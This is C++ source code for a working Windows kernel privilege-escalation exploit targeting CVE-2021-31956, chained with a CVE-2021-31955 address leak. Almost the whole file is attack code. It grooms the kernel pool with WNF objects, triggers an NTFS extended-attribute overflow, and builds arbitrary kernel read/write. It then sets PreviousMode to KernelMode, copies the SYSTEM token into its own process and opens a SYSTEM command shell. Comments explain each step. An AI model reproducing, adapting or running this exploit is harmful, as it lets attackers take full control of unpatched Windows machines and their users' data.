// 31956Custom.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include "pch.h"
#include "Helper.h"
#include "Header.h"


// Will hold the main state name sprays
//
WNF_STATE_NAME StateNamesList1[SPRAY_COUNT] = { 0 };

// This will hold the 2nd state name spray after we corrupted, hopefully increase the chance of us having one right after the corrupted _WNF_STATE_DATA
WNF_STATE_NAME StateNamesList2[SPRAY_COUNT] = { 0 };


bool TriggerOverflow()
{
	// We need a file to trigger the bug
	//
	HANDLE hFile = CreateFileA("TriggerBug",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (!hFile || hFile == INVALID_HANDLE_VALUE)
	{
		Ulog("Could not create file with error (%lx).", GetLastError());
		return false;
	}

	DWORD dwNumbersOfBytesWritten = 0;
	if (!WriteFile(hFile, "fs0x30", 6, &dwNumbersOfBytesWritten, NULL))
	{
		Ulog("Could not write to file with error (%lx).", GetLastError());
		return false;
	}

	// We will now craft the buffer with two EA_INFORMATION in a row next to each other
	//

	// First EA_INFORMATION
	UCHAR Buffer[1000] = { 0 };

	PFILE_FULL_EA_INFORMATION pEAInformations = reinterpret_cast<PFILE_FULL_EA_INFORMATION>(Buffer);

	// Fill these to match the outbuffer_size
	pEAInformations->Flags = 0;
	pEAInformations->EaNameLength	 = TRIGGER_EA_NAME_LENGTH;  // Default is 0x3
	pEAInformations->EaValueLength	 = TRIGGER_EA_VALUE_LENGTH; // Default is 0xa1

	// Fill the value's name, this part doesn't matter what is in it
	RtlCopyMemory(pEAInformations->EaName, TRIGGER_EA_NAME, TRIGGER_EA_NAME_LENGTH);

	// Calculate where the next EA_INFORMATION will be and then align it to 4 bytes
	pEAInformations->NextEntryOffset = (pEAInformations->EaNameLength + pEAInformations->EaValueLength + 3 + 9) & (~3);

	// Second EA_INFORMATION, calculate by the beginning of Buffer which is also the beginning of the first EA_INFORMATION, + the calculated offset
	// Note that this is still pointing to the same buffer, just with an offset
	PFILE_FULL_EA_INFORMATION pSecondEAInformation_Overflow = reinterpret_cast<PFILE_FULL_EA_INFORMATION>(Buffer + pEAInformations->NextEntryOffset);

	// To let kernel know that this is the last EA entry
	pSecondEAInformation_Overflow->NextEntryOffset = 0;
	pSecondEAInformation_Overflow->Flags = 0;

	// These control how much we want to overflow by
	//
	pSecondEAInformation_Overflow->EaNameLength  = OVERFLOW_EA_NAME_LENGTH;
	pSecondEAInformation_Overflow->EaValueLength = OVERFLOW_EA_VALUE_LENGTH;

	RtlCopyMemory(pSecondEAInformation_Overflow->EaName, OVERFLOW_EA_NAME, OVERFLOW_EA_NAME_LENGTH);
	// This would mean overflow is by (0x4+0xf) - (0x3+0xa1) = 0x13 - 0xa4 = 0xFFFFFFFFFFFFFF6F
	// 0x4 + 0xf + 0x9 = 0x1c will be memcpy and overflow over the next pool object
	// 0x10 will overwrite the POOL_HEADER
	// the other 0xc will give us full control of _WNF_STATE_DATA

	// At this point, the whole second EA_INFORMATION will be copied to the next pool object, overwriting and corrupting it
	// Since we want to corrupt _WNF_STATE_DATA's AllocatedSize and DataSize and ChangeStamp, we will interpret this as a WNF_STATE_DATA after +0x10 bytes due to POOL_HEADER
	_WNF_STATE_DATA* pWNFStateData = reinterpret_cast<_WNF_STATE_DATA*>(reinterpret_cast<UCHAR*>(pSecondEAInformation_Overflow) + 0x10);

	// AllocatedSize determine how far we could relative write
	//
	pWNFStateData->AllocatedSize = OVERFLOWN_STATEDATA_LENGTH;

	// DataSize determine how far we could relative read
	//
	pWNFStateData->DataSize = OVERFLOWN_STATEDATA_LENGTH;

	// IMPORTANT PART
	// ------------------------------------------------
	// Here, we will overwrite the next pool with something like this
	// 1c 00 00 00 00 04 0f 00-2e 46 53 58 00 44 44 44  .........FSX.DDD
	// We cannot control the first 4 bytes, we can kinda control the next 4 bytes, and we can control the rest
	// The first 4 bytes will be the size of EaName and EaValue + 9, then the 4 bytes is the structure data
	// then the rest is the data we want to write through EaName and the rest of the buffer, all of these will be written to the next pool object



	/*
	
	HANDLE           FileHandle,
	PIO_STATUS_BLOCK IoStatusBlock,
	PVOID            Buffer,
	ULONG            Length

	*/

	IO_STATUS_BLOCK EaStatusBlock = { 0 };
	NTSTATUS Status = NtSetEaFile(hFile, &EaStatusBlock, Buffer, sizeof Buffer);

	if (Status != 0)
	{
		Ulog("Could not set EA file with error (%lx).", Status);
		return false;
	}

	// Create the output buffer to receive the data, but mostlt only used to trigger the leak
	//
	UCHAR OutBuffer[0x1000] = { 0 };

	// Craft the EaList request for the extended attributes we set earlier, we will just allocate 100 bytes for it
	//
	PFILE_GET_EA_INFORMATION pEaListRequest = reinterpret_cast<PFILE_GET_EA_INFORMATION>(new BYTE[100]());

	if (!pEaListRequest)
	{
		Ulog("Could not allocate memory for EaList request.");
		return false;
	}

	// First EA_INFORMATION
	RtlCopyMemory(pEaListRequest->EaName, TRIGGER_EA_NAME, TRIGGER_EA_NAME_LENGTH);
	pEaListRequest->EaNameLength	= TRIGGER_EA_NAME_LENGTH;
	pEaListRequest->NextEntryOffset = (pEaListRequest->EaNameLength + 9) & (~3); // Align to 4 bytes which should result in 0xc AKA 12

	// Second EA_INFORMATION, same buffer but now pointing to the 2nd entry
	PFILE_GET_EA_INFORMATION pSecondEaListRequest = reinterpret_cast<PFILE_GET_EA_INFORMATION>(reinterpret_cast<PUCHAR>(pEaListRequest) + pEaListRequest->NextEntryOffset);
	RtlCopyMemory(pSecondEaListRequest->EaName, OVERFLOW_EA_NAME, OVERFLOW_EA_NAME_LENGTH);
	pSecondEaListRequest->EaNameLength = OVERFLOW_EA_NAME_LENGTH;
	pSecondEaListRequest->NextEntryOffset = 0;


	/*
	
	HANDLE           FileHandle,
	PIO_STATUS_BLOCK IoStatusBlock,
	PVOID            Buffer,
	ULONG            Length,
	BOOLEAN          ReturnSingleEntry,
	PVOID            EaList,
	ULONG            EaListLength,
	PULONG           EaIndex,
	BOOLEAN          RestartScan

	*/

	EaStatusBlock = { 0 };
	// KERNEL_ALLOC_SIZE must be the same as the first EA_INFORMATION's name length + value length + 9 so we underflow
	Status = NtQueryEaFile(hFile, &EaStatusBlock, OutBuffer, KERNEL_ALLOC_SIZE, FALSE, pEaListRequest, 100, 0, TRUE);

	if (Status != 0)
	{	
		// Clean up
		if (pEaListRequest)
		{
			delete[] pEaListRequest;
			pEaListRequest = nullptr;
		}

		Ulog("Could not Query EA file to trigger the bug with status (%lx).", Status);
		return false;
	}

	// Clean up
	if (pEaListRequest)
	{
		delete[] pEaListRequest;
		pEaListRequest = nullptr;
	}

	return true;
}

bool ReadRelativeBuffer(PWNF_STATE_NAME CorruptedStateName, PVOID TempBuffer, ULONG TempBufferSize)
{
	// We will use NtQueryWnfStateData to read relative memory, and we need to do this every time to get to the closest _WNF_NAME_INSTANCE
	// This could be improved but we want the most "up-to-date" buffer so that when we over flow it is less likely to have 
	// outdated data that could cause a crash
	//
	WNF_CHANGE_STAMP ChangeStamp = { 0 };
	NTSTATUS Status = NtQueryWnfStateData(CorruptedStateName, NULL, NULL, &ChangeStamp, TempBuffer, &TempBufferSize);

	if (Status != 0)
	{
		return false;
	}

	return true;
}

bool PointStateDataToAddress(PWNF_STATE_NAME CorruptedStateName, UINT_PTR Address, UINT_PTR* Out_ExternalStateName, INT Offset)
{
	UCHAR TempBuffer[OVERFLOWN_STATEDATA_LENGTH] = { 0 };
	ULONG TempReadBufferSize = OVERFLOWN_STATEDATA_LENGTH;

	// Don't know why but under debugger, the buffer is copied at a -0x30 offset, so we will + 0x30 here to compensate
	if (!ReadRelativeBuffer(CorruptedStateName, TempBuffer, TempReadBufferSize))
	{
		Ulog("Could not get relative read buffer through PWNF_STATE_NAME.");
		return false;
	}

	// Here, we have the corrupted _WNF_STATE_DATA, we will use it to perform a relative READ/WRITE into the _WNF_NAME_INSTANCE
	// Buffer here now hold the leaked data, read by NtQueryWnfStateData, we will look for _WNF_NAME_INSTANCE in the next buffer
	PWNF_NAME_INSTANCE nameInstance = FindNameInstance(TempBuffer, TempReadBufferSize);

	if (!nameInstance)
	{
		Ulog("Could not find _WNF_NAME_INSTANCE within the leaked buffer.");
		return false;
	}

	// We cannot cast the nameInstance->StateName to a UINT_PTR because it is a struct, so we will use a trick to get the address
	// and cast it as a pointer so we could then dereference it back to a UINT_PTR
	//
	*Out_ExternalStateName = *reinterpret_cast<UINT_PTR*>(&(nameInstance->StateName));

	// Point the StateData to the address we want to read/write
	// 
	nameInstance->StateData = reinterpret_cast<_WNF_STATE_DATA *>(Address + Offset);

	ULONG OverflowLength = (reinterpret_cast<UINT_PTR>(nameInstance) + sizeof(_WNF_NAME_INSTANCE)) - reinterpret_cast<UINT_PTR>(TempBuffer);

	Ulog("Found ExternalStateName of (%llx), with nameInstance at %p, we will only overflow %ld bytes.",
		*Out_ExternalStateName, nameInstance, OverflowLength);

	// Now we will update the state data with the new address, this will overwrite the entire 0x1000 bytes buffer with almost
	// identical content (because we just read this buffer from the kernel) but with one change and that is the StateData.
	// Note: This OverflowLength must be the same or less than the initialized buffer (0x1000). If it is more, the kernel will realize that
	// it won't be able to fit the old buffer into the new buffer and will allocate a new buffer, which will be in a different location that we don't want it to be
	// So this should be =< 0x1000 
	//
	NTSTATUS Status = NtUpdateWnfStateData(CorruptedStateName, TempBuffer, OverflowLength, NULL, NULL, NULL, 0);

	if (Status != 0)
	{
		Ulog("Could not update WNF state data with new address (%llx) with error (%lx).", Address, Status);
		return false;
	}

	return true;
}


bool ReadQWord(PWNF_STATE_NAME CorruptedStateName, UINT_PTR Address, UINT_PTR& Result, UINT_PTR* OutInternalStateName)
{
	UINT_PTR ExternalStateName = 0;
	if (!PointStateDataToAddress(CorruptedStateName, Address, &ExternalStateName, -0x8))
	{
		Ulog("Could not point state data to address (%llx).", Address);
		return false;
	}

	WNF_CHANGE_STAMP Stamp     = {};
	UCHAR Buffer[0x1000]	   = { 0 };
	ULONG BufferSize		   = sizeof Buffer;
	UINT_PTR InternalStateName = ExternalStateName ^ STATE_NAME_MASK;
	NTSTATUS Status = NtQueryWnfStateData((PWNF_STATE_NAME)&InternalStateName, NULL, NULL, &Stamp, Buffer, &BufferSize);

	// When we point the StateData to the address we want to read, that StateData ptr will be interpreted as the struct _WNF_STATE_DATA
	//   + 0x000 Header           : _WNF_NODE_HEADER
	//	 + 0x004 AllocatedSize    : 0
	//	 + 0x008 DataSize : 0x74d86088
	// 	 + 0x00c ChangeStamp : 0xffff968b
	//
	//	Now obviously, if we point this to an address that is not a valid _WNF_STATE_DATA, the kernel will interpret the data as a
	//  some other value, which mean DataSize might be some huge number that will cause the kernel to crash when it tries to read
	//  if you provide it a big enough buffer or will just error with 0xC0000023 if you don't provide a big enough buffer
	//  However, even if it does fail - it will always return the ChangeStamp, and the DataSize which in turn will let us read 8 bytes
	//  at +0x8 from the buffer, which is the address we want to read. This is why PointStateDataToAddress will + 0x8 to the address we want to read
	//  The reason it is +8 is at 0 it is _WNF_NODE_HEADER and at 0x4 it is AllocatedSize.
	//
	if (Status == 0 || Status == 0xC0000023)
	{
		// Combine the two 32-bit values into a 64-bit value
		Result = ((UINT_PTR)Stamp << 32) | BufferSize;

		if (OutInternalStateName)
		{
			*OutInternalStateName = InternalStateName;
		}

		return true;
	}

	Ulog("Could not read kernel memory at address (%llx) with error (%lx) Buffer size out (%lx).", Address, Status, BufferSize);
	return false;}


bool Spray()
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	PSECURITY_DESCRIPTOR pSecurityDescriptor = nullptr;

	if (!ConvertStringSecurityDescriptorToSecurityDescriptor(L"",
		SDDL_REVISION_1, &pSecurityDescriptor, nullptr))
	{
		Ulog("Could not convert NULL string security descriptor to security descriptor.");
		return false;
	}

	// Spray the pool with _WNF_NAME_INSTANCE, this should be done after we already corrupted one of the _WNF_STATE_DATA
	// This increase the chance of us having a _WNF_NAME_INSTANCE within reach so we could use it as a target to be corrupted further
	//
	for (size_t i = 0; i < SPRAY_COUNT; i++)
	{
		Status = NtCreateWnfStateName(&StateNamesList2[i], WnfTemporaryStateName, WnfDataScopeUser, FALSE, NULL, 0x1000, pSecurityDescriptor);

		if (Status != 0)
		{
			if (pSecurityDescriptor)
			{
				LocalFree(pSecurityDescriptor);
				pSecurityDescriptor = nullptr;
			}

			Ulog("Could not create WNF state name at index (%lld) with error (%lx).", i, Status);
			return false;
		}
	}
	return true;
}

bool Groom()
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	PSECURITY_DESCRIPTOR pSecurityDescriptor = nullptr;

	if (!ConvertStringSecurityDescriptorToSecurityDescriptor(L"",
		SDDL_REVISION_1, &pSecurityDescriptor, nullptr))
	{
		Ulog("Could not convert NULL string security descriptor to security descriptor.");
		return false;
	}


	// Spray the pool with _WNF_NAME_INSTANCE, hopefully to get many sequential allocations
	for (size_t i = 0; i < SPRAY_COUNT; i++)
	{
		// At this point, the pool llocations should look like this:
		// 
		// 
		// [ _WNF_NAME_INSTANCE | _WNF_NAME_INSTANCE | _WNF_NAME_INSTANCE | _WNF_NAME_INSTANCE | ... ]
		//
		//
		// While MaximumStateSize is 0x1000, the structure itself that is being allocated inside the segment pool is 0xa8 + POOL_HEADER (0x10) = 0xb8
		// which fall into the 0xc0 bucket, and therefore will be the same bucket as our crafted _WNF_STATE_DATA and later, FILE_FULL_EA_INFORMATION allocations

		Status = NtCreateWnfStateName(&StateNamesList1[i], WnfTemporaryStateName, WnfDataScopeUser, FALSE, NULL, 0x1000, pSecurityDescriptor);

		if (Status != 0)
		{
			if (pSecurityDescriptor)
			{
				LocalFree(pSecurityDescriptor);
				pSecurityDescriptor = nullptr;
			}

			Ulog("Could not create WNF state name at index (%lld) with error (%lx).", i, Status);
			return false;
		}
	}


	BYTE Buffer[0xa0] = { 0 };
	for (size_t i = 1; i < SPRAY_COUNT; i += 2)
	{
		// Now we free every other allocations of _WNF_NAME_INSTANCE, leaving holes in the pool allocations
		// At this point, the pool llocations should look like this:
		// 
		// 
		// [ _WNF_NAME_INSTANCE | FREE | _WNF_NAME_INSTANCE | FREE | _WNF_NAME_INSTANCE | FREE | _WNF_NAME_INSTANCE ]
		//
		//
		Status = NtDeleteWnfStateName(&StateNamesList1[i]);
		if (Status != 0)
		{
			if (pSecurityDescriptor)
			{
				LocalFree(pSecurityDescriptor);
				pSecurityDescriptor = nullptr;
			}

			return false;
		}
		StateNamesList1[i].Data[0] = 0;
		StateNamesList1[i].Data[1] = 0;

		// Immediately after freeing the _WNF_NAME_INSTANCE, we use NtUpdateWnfStateData to allocate an arbitrary sized buffer of 0xa0 bytes, hopefully in the same spot
		// as the _WNF_NAME_INSTANCE we just freed
		// At this point, the pool llocations should look like this:
		// 
		//
		// [ _WNF_NAME_INSTANCE | _WNF_STATE_DATA | _WNF_NAME_INSTANCE | _WNF_STATE_DATA | _WNF_NAME_INSTANCE | _WNF_STATE_DATA | _WNF_NAME_INSTANCE | _WNF_STATE_DATA | _WNF_NAME_INSTANCE ]
		//
		//
		// We use 0xa0 as allocation, + 0xc (WNF_STATE_DATA size) + 0x10 (POOL_HEADER) = 0xbc because it will fall into the 0xc0 bucket, which is the same bucket as the _WNF_NAME_INSTANCE we just freed
		Status = NtUpdateWnfStateData((PWNF_STATE_NAME)&StateNamesList1[i - 1], &Buffer, 0xa0, NULL, NULL, NULL, 0);
		if (Status != 0)
		{
			if (pSecurityDescriptor)
			{
				LocalFree(pSecurityDescriptor);
				pSecurityDescriptor = nullptr;
			}

			return false;
		}
	}


	for (size_t i = 0; i < SPRAY_COUNT; i += 4)
	{
		// Here, in a perfect world, we will free every other _WNF_NAME_INSTANCE, leaving this layout
		// 
		// 
		// [ FREE | _WNF_STATE_DATA | _WNF_NAME_INSTANCE | _WNF_STATE_DATA | FREE | _WNF_STATE_DATA | _WNF_NAME_INSTANCE | _WNF_STATE_DATA | FREE | _WNF_STATE_DATA | _WNF_NAME_INSTANCE | _WNF_STATE_DATA]
		//
		//
		// What we want is a FREE buffer of 0xc0 bytes, followed by a _WNF_STATE_DATA, _WNF_NAME_INSTANCE
		// This will allow us to allocate a buffer of 0xc0 later, overflow into _WNF_STATE_DATA, corrupting it, so then we could use _WNF_STATE_DATA to
		// perform a relative READ/WRITE into _WNF_NAME_INSTANCE which should be next to it, and then we can use _WNF_NAME_INSTANCE to perform an arbitrary READ/WRITE across the whole system
		//

		// Have to delete the associated StateData first before we delete the State Name
		// We don't care if it fail?
		//
		NtDeleteWnfStateData(&StateNamesList1[i], NULL);
		NtDeleteWnfStateName(&StateNamesList1[i]);

		StateNamesList1[i].Data[0] = 0;
		StateNamesList1[i].Data[1] = 0;

	}

	if (pSecurityDescriptor)
	{
		LocalFree(pSecurityDescriptor);
		pSecurityDescriptor = nullptr;
	}

	// If all else is good, the next 0xc0 object being allocated into the fragmented heap should be infront of a _WNF_STATE_DATA follows by _WNF_NAME_INSTANCE
	//

	return true;
}

bool CleanupToRetry()
{
	for (size_t i = 0; i < SPRAY_COUNT; i++)
	{
		if (StateNamesList1[i].Data[0] || StateNamesList1[i].Data[1])
		{
			NtDeleteWnfStateData(&StateNamesList1[i], NULL);
			NtDeleteWnfStateName(&StateNamesList1[i]);


			StateNamesList1[i].Data[0] = 0;
			StateNamesList1[i].Data[1] = 0;
		}

		if (StateNamesList2[i].Data[0] || StateNamesList2[i].Data[1])
		{
			NtDeleteWnfStateData(&StateNamesList2[i], NULL);
			NtDeleteWnfStateName(&StateNamesList2[i]);


			StateNamesList2[i].Data[0] = 0;
			StateNamesList2[i].Data[1] = 0;
		}
	}

	return true;
}


bool FlipPreviousMode(PWNF_STATE_NAME pNameInstance, UINT_PTR pEProcess, DWORD Value)
{
	// _KPROCESS.ThreadListHead 
	//
	UINT_PTR pThreadListHead = pEProcess + 0x30;

	UINT_PTR ThreadListHead = 0;
	if (!ReadQWord(pNameInstance, pThreadListHead, ThreadListHead) || ThreadListHead == 0)
	{
		Ulog("Could not read kernel memory at address (%llx) Result (%llx).", pThreadListHead, ThreadListHead);
		return false;
	}

	Ulog("Dumping kernel memory ThreadListHead at address (%llx)= %llx.",
		pThreadListHead, ThreadListHead);

	// See how does once traverse the LIST_ENTRY structure list
	// Basically LIST_ENTRY is a doubly linked list and will always be somewhere in the middle of the struct it is linking
	// If you want to get the actual struct, you need to find the list's offset from the base of the struct, and then subtract the list
	// by the offset to get back to the top. In this case, the LIST_ENTRY (name ThreadListEntry) is 0x2f8 bytes from the base of the _KTHREAD struct
	// https://www.codeproject.com/Articles/800404/Understanding-LIST-ENTRY-Lists-and-Its-Importance
	UINT_PTR pKThread = ThreadListHead - THREAD_LIST_ENTRY_OFFSET;

	// See KTHREAD struct
	//
	UINT_PTR pPreviousMode = pKThread + PREVIOUS_MODE_OFFSET;

	UINT_PTR PreviousMode = 0;


	if (!ReadQWord(pNameInstance, pPreviousMode, PreviousMode))
	{
		Ulog("Could not read kernel memory at address (KTHREAD + 0x232 %llx).", pPreviousMode);
		return false;
	}

	// Neither should be null, but just in case to detect fail-case somewhere
	//
	if (!PreviousMode)
	{
		Ulog("Result (%llx) is null.", PreviousMode);
		return false;
	}

	UINT_PTR ExternalStateName = 0;
	
	// We will now point it to the where we want to write to, - 0x10 because _WNF_STATE_DATA is 0x10 bytes
	// and it will write the data to after the struct. Since we are not writing to one of the Header / Field
	// - 0x10 will align the "buffer" to the right place. Here, we will have to also hope that the data we pointing to
	// aka + 0x222 can be interpret as proper _WNF_STATE_DATA struct so that we can write to it. Luckily,
	// the data at 0x222 is in the middle of the field KPROCESS which should always be filled.
	//
	if (!PointStateDataToAddress(pNameInstance, pPreviousMode, &ExternalStateName, -0x10))
	{
		Ulog("PointStateDataToAddress failed to point to pPreviousMode.");
		return false;
	}

	// Change the first byte to 0 aka PreviousMode = KernelMode
	(reinterpret_cast<UCHAR *>(&PreviousMode))[0] = (UCHAR)Value;
	UINT_PTR InternalStateName = ExternalStateName ^ STATE_NAME_MASK;

	NTSTATUS Status = NtUpdateWnfStateData(reinterpret_cast<PWNF_STATE_NAME>(&InternalStateName), &PreviousMode, 3, NULL, NULL, NULL, 0);

	if (Status != 0)
	{
		Ulog("NtUpdateWnfStateData failed with status (%x).", Status);
		return false;
	}

	return true;
}

PWNF_NAME_INSTANCE FindNameInstance(UCHAR* Buffer, DWORD BufferLength)
{
	for (UCHAR* Ptr = Buffer; Ptr < Buffer + BufferLength; Ptr++)
	{
		// We are looking for these value, to let us know that this is the beginning of a _WNF_NAME_INSTANCE
		// NameIns->Header.NodeByteSize == 0xa8
		// NameIns->Header.NodeTypeCode == 0x903 
		if (Ptr[0] == 0x03 && Ptr[1] == 0x09 && Ptr[2] == 0xa8)
		{
			return reinterpret_cast<PWNF_NAME_INSTANCE>(Ptr);
		}
	}

	return 0;
}


bool RevertPreviousMode(UINT_PTR pEProcess)
{
	// Get ThreadListHead
	UINT_PTR ThreadListHead = 0;
	if (!NtReadWrapper(pEProcess + 0x30, &ThreadListHead, sizeof ThreadListHead))
	{
		Ulog("Failed to read EPROCESS at address (%llx) and get the ThreadListHead.", pEProcess + 0x30);
		return false;
	}

	UINT_PTR pKThread = ThreadListHead - THREAD_LIST_ENTRY_OFFSET;

	// See KTHREAD struct
	//
	UINT_PTR pPreviousMode = pKThread + PREVIOUS_MODE_OFFSET;

	bool PreviousMode = 1;
	bool result = NtWriteWrapper(pPreviousMode, &PreviousMode, sizeof(PreviousMode));

	if (!result)
	{
		Ulog("Failed to write to EPROCESS at address (%llx) and revert the PreviousMode back to %llx.", pEProcess + PREVIOUS_MODE_OFFSET, PreviousMode);
		return false;
	}

	return true;
}

bool RevertOtherChanges(UINT_PTR pEProcess, UINT_PTR BackupToken)
{
	bool result = NtWriteWrapper(pEProcess + TOKEN_OFFSET, &BackupToken, sizeof(BackupToken));
	if (!result)
	{
		Ulog("Failed to write to EPROCESS at address (%llx) and revert the token back to %llx.", pEProcess + TOKEN_OFFSET, BackupToken);
		return false;
	}

	// A ton of other fixes needed to be done to fix all the corrupted pool goes here

	return true;
}

bool TokenStealing(UINT_PTR EProcess, UINT_PTR* BackupToken)
{
	
	ULONG UniqueProcessIdOffset = 0x440;
	ULONG ActiveProcessLinksOffset = 0x448;

	UINT_PTR StartingEProcess = EProcess;
	UINT_PTR SystemEProcessAddress = 0;

	UCHAR TempBuffer[0x500] = {};
	do
	{
		// Read the EPROCESS structure.
		bool result = NtReadWrapper(StartingEProcess, TempBuffer, sizeof(TempBuffer));

		if (!result)
		{
			Ulog("Failed to read EPROCESS at address (%llx).", StartingEProcess);
			return false;
		}

		// Read the UniqueProcessId field.
		UINT_PTR UniqueProcessIdBuffer = 0;
		result = NtReadWrapper(StartingEProcess + UniqueProcessIdOffset, &UniqueProcessIdBuffer, sizeof(UniqueProcessIdBuffer));
		if (!result)
		{
			Ulog("Failed to read UniqueProcessId at address (%llx).", StartingEProcess + UniqueProcessIdOffset);
			return false;
		}

		// Check if this process is the "SYSTEM" process.
		if (UniqueProcessIdBuffer == 4)
		{
			SystemEProcessAddress = StartingEProcess;
			break;
		}

		// Get the address of the next EPROCESS structure in the list.
		StartingEProcess = (UINT_PTR)(((_LIST_ENTRY*)(TempBuffer+ ActiveProcessLinksOffset))->Flink) - ActiveProcessLinksOffset;

	} while (StartingEProcess != EProcess);

	if (SystemEProcessAddress != 0)
	{
		Ulog("Found SYSTEM EPROCESS structure at address (%llx).", SystemEProcessAddress);


		// Found the SYSTEM EPROCESS structure.
		// Backup the original token.
		bool result = NtReadWrapper(EProcess + TOKEN_OFFSET, BackupToken, sizeof(*BackupToken));

		if (!result)
		{
			return false;
		}

		// Read the token of the System process.
		UINT_PTR TokenBuffer = 0;
		result = NtReadWrapper(SystemEProcessAddress + TOKEN_OFFSET, &TokenBuffer, sizeof(TokenBuffer));
		if (!result)
		{
			return false;
		}

		// Write the token of the System process into the current process.
		result = NtWriteWrapper(EProcess + TOKEN_OFFSET, &TokenBuffer, sizeof(TokenBuffer));
		if (!result)
		{
			return false;
		}
	}
	else
	{
		Ulog("Failed to find SYSTEM EPROCESS structure.");
		return false;
	}

	Ulog("Successfully stole token from SYSTEM process.");
	return true;
}

bool NtReadWrapper(UINT_PTR Address, PVOID Buffer, ULONG BufferSize)
{
	NTSTATUS status;
	HANDLE processHandle = GetCurrentProcess();
	SIZE_T NumberOfBytesRead;

	status = NtReadVirtualMemory(processHandle, (PVOID)Address, Buffer, BufferSize, &NumberOfBytesRead);

	if (status == 0 && NumberOfBytesRead == BufferSize)
	{
		return true;
	}

	Ulog("Failed to read address (%llx) with status (%x).", Address, status);
	return false;
}

bool NtWriteWrapper(UINT_PTR Address, PVOID Buffer, ULONG BufferSize)
{
	NTSTATUS status = 0;
	HANDLE processHandle = GetCurrentProcess();
	SIZE_T NumberOfBytesWritten = 0;

	status = NtWriteVirtualMemory(processHandle, (PVOID)Address, Buffer, BufferSize, &NumberOfBytesWritten);

	if (status == 0 && NumberOfBytesWritten == BufferSize)
	{
		return true;
	}

	Ulog("Failed to write address (%llx) with status (%x).", Address, status);
	return false;
}

bool Exploit(UINT_PTR pEProcess)
{
	if (!pEProcess)
	{
		Ulog("Invalid EPROCESS.");
		return false;
	}

	if (!Groom())
	{
		Ulog("Could not groom the pool.");
		return false;
	}

	if (!TriggerOverflow())
	{
		Ulog("Could not create leak through integer underflow.");
		return false;
	}
	
	// Here we will go through every single _WNF_STATE_DATA and find the one with the 0xcafe as ChangeStamp to determine if it is corrupted
	//
	for (size_t i = 0; i < SPRAY_COUNT; i += 2)
	{
		// Skip free'd ones
		//
		if (StateNamesList1[i].Data[0] == 0 && StateNamesList1[i].Data[1] == 0)
			continue;

		// This should not be enough to hold the buffer, so it will fail with STATUS_BUFFER_TOO_SMALL for all of our allocation BUT the one that is corrupted
		ULONG BufferSize						 = 0xa0;
		WNF_CHANGE_STAMP ChangeStamp			 = { 0 };
		UCHAR Buffer[OVERFLOWN_STATEDATA_LENGTH] = { 0 };
		NTSTATUS Status = NtQueryWnfStateData(&StateNamesList1[i], NULL, NULL, &ChangeStamp, &Buffer, &BufferSize);

		// STATUS_BUFFER_TOO_SMALL, which mean it is NO LONGER 0xa0 bytes, but it is now 0x1000 bytes (corrupted)
		// That mean this is the buffer we are looking for
		if (Status == 0xC0000023)
		{
			if (IsStateNameDeleted(&StateNamesList1[i]))
			{
				Ulog("Found corrupted _WNF_STATE_DATA at index %d, but it is already deleted.", i);
				continue;
			}

			if (!FlipPreviousMode(&StateNamesList1[i], pEProcess, 0 /* KernelMode */))
			{
				Ulog("Could not flip the PreviousMode to KernelMode.");
				return false;
			}

			Ulog("We flipped PreviousMode to KernelMode, now we can R/W wherever we want");

			UINT_PTR backupToken = 0;
			if (!TokenStealing(pEProcess, &backupToken))
			{
				Ulog("Could not steal the token.");
				return false;
			}

			Ulog("Backup Token is %llx", backupToken);

			if (!RevertPreviousMode(pEProcess))
			{
				Ulog("Failed to revert the PreviousMode back to %llx.", 1);
				return false;
			}

			Ulog("Enjoy system shell!");

			system("cmd.exe");

			/*
			if (!RevertOtherChanges(pEProcess, backupToken))
			{
				Ulog("Could not revert the changes.");
				return false;
			}
			*/

			Sleep(150000);
			return true;
		}
	}

	// Ulog("Failed to find the corrupted _WNF_STATE_DATA, therefore we might've just fucked up.");

	return false;
}

bool IsStateNameDeleted(PWNF_STATE_NAME StateName)
{
	// This will make sure that although the buffer matches up, it is also free'd/deleted by us already as it is not in our list
	// so therefore we can't really interact with this free buffer no more, exploit fail here
	for (size_t i = 0; i < SPRAY_COUNT; i += 2)
	{
		if (StateNamesList1[i].Data[0] == StateName->Data[0] &&
			StateNamesList1[i].Data[1] == StateName->Data[1])
		{
			return false;
		}
	}

	return true;
}

int main()
{
	if (!InitializeUndocumentedAPI())
	{
		Ulog("Could not initialize undocumented API.");
		Sleep(100000);
		return false;
	}

	// Could also use _WNF_NAME_INSTANCE.CreatorProcess but we might as well chain exploit for demonstration purposes
	//
	UINT_PTR pEPROCESS = LeakEPProcess(GetCurrentProcessId());

	if (!pEPROCESS)
	{
		Ulog("Could not leak EPROCESS through CVE-2021-31955.");
		return false;
	}

	for (size_t i = 0; i < 25; i++)
	{
		if (!Exploit(pEPROCESS))
		{
			Ulog("[%lld] Could not exploit CVE-2021-31956", i);
			// CleanupToRetry();
		}
		else
		{
			break;
		}

	}

	Ulog("On exit...");
	Sleep(100000);


	return 1;
}